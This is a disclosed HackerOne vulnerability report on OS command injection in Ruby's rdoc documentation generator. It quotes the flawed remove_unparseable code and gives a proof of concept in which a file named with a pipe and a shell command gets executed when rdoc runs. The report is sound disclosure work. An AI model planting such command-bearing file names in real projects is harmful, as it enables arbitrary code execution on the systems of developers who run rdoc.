# OS Command Injection in 'rdoc' documentation generator

## Report Details
- **Report ID**: 1161691
- **URL**: https://hackerone.com/reports/1161691
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-04-12T16:47:15.754Z
- **Disclosed**: 2021-07-13T07:38:03.945Z

## Reporter
- **Username**: sighook
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
Details:
If the `remove_unparseable` function  receives a list of files with a command in the name of one of them, it will be executed.
Just enough the name to match the pattern. The problem code:
```ruby
  def remove_unparseable files
    files.reject do |file, *|
      file =~ /\.(?:class|eps|erb|scpt\.txt|svg|ttf|yml)$/i or
        (file =~ /tags$/i and
         open(file, 'rb') { |io|
           io.read(100) =~ /\A(\f\n[^,]+,\d+$|!_TAG_)/
         })
    end
  end
```


# PoC

```bash
$ touch '| touch evil.txt && echo tags'
$ ls
'| touch evil.txt && echo tags'
$ rdoc --all
Parsing sources...
100% [ 1/ 1]  | touch evil.txt && echo tags

Generating Darkfish format into /home/tmp/doc...

  Files:      1

  Classes:    0 (0 undocumented)
  Modules:    0 (0 undocumented)
  Constants:  0 (0 undocumented)
  Attributes: 0 (0 undocumented)
  Methods:    0 (0 undocumented)

  Total:      0 (0 undocumented)
    0.00% documented

  Elapsed: 0.1s

$ ls
doc   evil.txt  '| touch evil.txt && echo tags'
```

I set to the vulnerability the same severity as in https://hackerone.com/reports/651518, since rdoc is widely used on dev/production systems and, therefore, the attack also has a wide range of applications.  An attacker can hide a bad-named-file deep in the project structure to be stealthy some time.

## Impact

An attacker can leverage this weakness to execute arbitrary commands, disclose sensitive information and cause denial of service.

## Attachments
No attachments
